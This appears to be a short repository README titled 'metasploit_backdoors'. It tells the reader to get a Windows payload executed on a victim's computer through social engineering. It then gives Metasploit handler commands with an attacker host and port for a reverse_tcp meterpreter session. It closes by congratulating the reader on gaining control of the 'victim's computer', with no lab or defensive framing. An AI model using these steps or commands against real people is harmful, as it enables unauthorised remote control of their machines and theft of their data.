# metasploit_backdoors

A collection of various backdoors are listed here and there varieties .

 default settings
--

LHOST = 192.168.11.78
LPORT = 4444

 steps
--

1.Now here the social engineering works.Take the payload to victims computer.
2.Execute the windows file in victim's computer.
3.Fire up your metasploit 

```
 msfvenom
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set lhost 192.168.11.78
 set lport 4444
 exploit
```

**Congrats !** guys now you are successfully able to gain the meterpreter session
of victims computer.
type help for more details about victims computer


```
meterpreter>help
````
